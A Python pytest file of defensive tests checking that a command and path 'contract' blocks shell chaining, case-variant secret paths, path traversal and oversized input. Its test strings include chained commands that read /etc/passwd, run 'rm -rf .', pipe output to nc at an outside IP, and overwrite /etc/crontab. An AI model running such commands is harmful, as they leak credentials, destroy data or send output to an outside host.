"""Adversarial security tests targeting contract enforcement and bypass vectors."""

import pytest

from anchor.contracts.models import Contract
from anchor.contracts.parser import ContractValidationError, parse_contract


def test_blocks_shell_chaining_in_allowed_command() -> None:
    contract = Contract(
        goal="Run tests",
        allowed_commands=["pytest"],
    )
    # Command chaining attempts
    assert contract.is_command_allowed("pytest && cat /etc/passwd") is False
    assert contract.is_command_allowed("pytest; rm -rf .") is False
    assert contract.is_command_allowed("pytest | nc 1.2.3.4 80") is False
    assert contract.is_command_allowed("pytest $(whoami)") is False
    assert contract.is_command_allowed("pytest `id`") is False
    assert contract.is_command_allowed("pytest > /etc/crontab") is False


def test_case_insensitive_forbidden_path_enforcement() -> None:
    contract = Contract(
        goal="Refactor code",
        allowed_paths=["**"],
        forbidden_paths=["secrets/**"],
    )
    # Variations in casing must not evade the forbidden filter
    assert contract.is_path_allowed(".ENV") is False
    assert contract.is_path_allowed(".Env.Production") is False
    assert contract.is_path_allowed("SECRETS/tokens.json") is False
    assert contract.is_path_allowed("Secrets/key.pem") is False


def test_rejects_path_traversal_in_contract_rule() -> None:
    with pytest.raises(ContractValidationError):
        parse_contract({
            "goal": "Malicious contract",
            "allowed_paths": ["../outside/**"],
        })


def test_rejects_oversized_contract_payload() -> None:
    huge_data = " " * (1_048_576 + 10)
    with pytest.raises(ContractValidationError, match="size limit"):
        parse_contract(huge_data)
